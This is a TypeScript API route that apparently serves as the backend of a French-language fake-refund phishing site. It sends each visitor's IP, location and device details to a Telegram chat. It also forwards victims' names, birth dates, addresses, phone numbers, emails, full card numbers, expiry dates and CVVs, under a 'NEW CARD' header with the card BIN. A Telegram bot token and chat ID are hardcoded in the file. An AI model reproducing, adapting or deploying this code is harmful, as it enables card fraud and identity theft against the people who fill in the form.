export async function POST(request: Request) {
  const TELEGRAM_BOT_TOKEN = "8087626663:AAFO23WworMjI3vk6DZVSetaMufoUu2G-w4"
  const TELEGRAM_CHAT_ID = "-1003561311047"

  try {
    const body = await request.json()

    if (body.type === "visitor") {
      const { ip, country, city, region, device, os, browser, model, dateTime } = body

      const deviceEmoji = device === "Mobile" ? "📱" : device === "Tablet" ? "📲" : "💻"

      const message = `🆕 *Nouveau visiteur sur le site*\n\n📅 *Date:* ${dateTime}\n\n🌐 *IP:* ${ip}\n📍 *Localisation:* ${city}, ${region}, ${country}\n\n${deviceEmoji} *Appareil:* ${device}\n📱 *Modele:* ${model}\n🖥️ *OS:* ${os}\n🌍 *Navigateur:* ${browser}`

      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      })

      if (!response.ok) {
        console.error("Telegram API error:", await response.text())
        return Response.json({ error: "Failed to send notification" }, { status: 500 })
      }

      return Response.json({ success: true })
    } else if (body.type === "form") {
      const {
        firstName,
        lastName,
        birthDate,
        address,
        postalCode,
        city,
        phone,
        email,
        cardNumber,
        expiryDate,
        cvv,
        cardName,
        device,
        os,
        browser,
        model,
        dateTime,
      } = body

      const bin = cardNumber.replace(/\s/g, "").substring(0, 6)
      const firstDigit = cardNumber.replace(/\s/g, "").charAt(0)

      let cardType = "UNKNOWN"
      if (firstDigit === "4") {
        cardType = "VISA"
      } else if (firstDigit === "5") {
        cardType = "MASTERCARD"
      } else if (firstDigit === "3") {
        cardType = "AMEX"
      } else if (firstDigit === "6") {
        cardType = "DISCOVER"
      }

      const deviceEmoji = device === "Mobile" ? "📱" : device === "Tablet" ? "📲" : "💻"

      const message = `🆕 *RIINA NEW CARD - ${cardType} ${bin}*\n\n📅 *Date:* ${dateTime}\n\n${deviceEmoji} *Appareil:* ${device}\n📱 *Modele:* ${model}\n🖥️ *OS:* ${os}\n🌍 *Navigateur:* ${browser}\n\n👤 *Prénom:* ${firstName}\n👤 *Nom:* ${lastName}\n🎂 *Date de naissance:* ${birthDate}\n📧 *Email:* ${email}\n📱 *Téléphone:* ${phone}\n\n🏠 *Adresse:*\n${address}\n📮 *Code postal:* ${postalCode}\n🏙️ *Ville:* ${city}\n\n💳 *Informations de paiement:*\n💳 *Numéro de carte:* ${cardNumber}\n📅 *Date d'expiration:* ${expiryDate}\n🔒 *CVV:* ${cvv}\n✍️ *Nom sur la carte:* ${cardName}\n\n💰 *Montant du remboursement:* 93,56 €`

      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      })

      if (!response.ok) {
        console.error("Telegram API error:", await response.text())
        return Response.json({ error: "Failed to send notification" }, { status: 500 })
      }

      return Response.json({ success: true })
    }

    return Response.json({ error: "Invalid notification type" }, { status: 400 })
  } catch (error) {
    console.error("Error sending Telegram notification:", error)
    return Response.json({ error: "Internal server error" }, { status: 500 })
  }
}
